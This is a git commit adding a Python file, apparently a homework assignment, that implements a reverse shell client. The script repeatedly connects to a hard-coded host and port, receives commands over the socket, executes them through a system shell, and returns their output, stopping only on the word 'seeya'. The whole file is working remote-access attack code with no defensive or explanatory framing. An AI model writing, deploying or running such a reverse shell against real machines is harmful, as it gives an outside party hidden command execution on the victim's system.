e0fdcf8bcc3671c4dd9b03ed1d26711f71e98056
kralouf <114093052+kralouf@users.noreply.github.com>
2025-03-03 14:48:28 -0600

    Create hw01-LK-client.py

---
+++ hw01/hw01-LK-client.py
@@ -0,0 +1,36 @@
+# Created by Louis Kraimer
+
+import socket
+import subprocess
+import os
+import sys
+import time
+
+def tuneconnection():
+    mysocket = socket.socket()
+    while True:
+        time.sleep(10)
+        try:
+            mysocket.connect(("10.17.122.20", 8080))
+            shell(mysocket)
+        except:
+            tuneconnection()
+
+def shell(mysocket):
+    while True:
+        command = mysocket.recv(5000)
+        if "seeya" in command.decode():
+            try:
+                mysocket.close()
+                break
+            except Exception as e:
+                informToServer = "!ERR!: " + str(e)
+                mysocket.send(informToServer.encode())
+                break
+        else:
+            cmd = subprocess.Popen(command.decode(), shell = True, stdin = subprocess.PIPE, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
+            mysocket.send(cmd.stdout.read())
+            mysocket.send(cmd.stderr.read())
+def main():
+    tuneconnection()
+main()
